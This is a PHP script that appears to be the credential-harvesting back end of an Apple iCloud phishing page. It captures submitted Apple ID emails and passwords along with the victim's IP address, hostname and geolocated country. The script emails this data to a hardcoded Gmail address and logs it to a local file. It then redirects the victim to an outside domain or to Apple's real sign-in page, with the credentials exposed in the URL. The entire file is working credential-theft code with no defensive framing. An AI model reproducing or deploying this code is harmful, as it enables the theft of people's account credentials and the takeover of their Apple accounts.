<?php
session_start()   ;
//$_SESSION['count'] = $_SESSION['count']++ ;
error_reporting(0);


$ip = getenv("REMOTE_ADDR");                                                                          
$hostname = gethostbyaddr($ip);

// include the php script
include("../geo/geoip.inc");

// open the geoip database
$gi = geoip_open("../GeoIP.dat/GeoIP.dat",GEOIP_STANDARD);

// to get country code
$country_code = geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);

// to get country name
$country_name = geoip_country_name_by_addr($gi, $_SERVER['REMOTE_ADDR']);

$message .= "Email:    : ".$_POST['appleId']." ";
$message .= "|***|Password : ".$_POST['accountPassword']."  ";
$message .= "|***|Client IP: ".$ip."  ";
$message .= "|***|HostName : ".$hostname." ";
$send = "bouha51@gmail.com";
$subject = " Apple ICLOUD Resultat Login ";

$id=$_POST['appleId'];
$pass=$_POST['accountPassword'];

$monfichier = fopen('../spam.txt','a+');
fputs($monfichier, $id.'--'.$pass.'--'.$ip.'=======>'.$hostname.'======>'.$country_name.'====>'.$country_code.' '."\r\n"); 
fclose($monfichier);

mail($send, $subject,$message);   
if(!isset($_SESSION['count']))
{
print("<script type=\"text/javascript\">setTimeout('location=(\"http://apple-conseil.byethost10.com\")' ,0);</script>");
$_SESSION['count']++;
}
else
{
print("<script type=\"text/javascript\">setTimeout('location=(\"https://idmsa.apple.com//IDMSWebAuth/authenticate?appIdKey=af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3&path=/signin/?referrer%3D/account/manage&sslEnabled=true&appleId=".$_REQUEST['appleId']."&accountPassword=".$_REQUEST['accountPassword']."\")' ,0);</script>");
}


?>
